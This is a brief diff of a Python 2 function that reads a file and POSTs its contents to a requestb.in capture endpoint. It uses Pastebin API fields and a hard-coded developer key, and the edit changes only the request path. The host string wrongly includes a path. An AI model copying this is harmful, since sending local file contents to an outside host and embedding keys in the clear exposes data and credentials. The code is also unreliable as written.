@@ -23,7 +23,7 @@ def paastebin():
         httpServ = httplib.HTTPConnection("requestb.in/1l28i7t1", 80)
         httpServ.connect()
         params = urllib.urlencode({'api_option': "paste", 'api_paste_private': 0, 'api_paste_expire_date': "10M", 'api_dev_key': "e8ef585291dc675b7bf9e7b66e340326",'api_paste_code': f.read()})
-        httpServ.request('POST', '/api/api_post.php', params)
+        httpServ.request('POST', '', params)
 
         response = httpServ.getresponse()
         print(response.status)
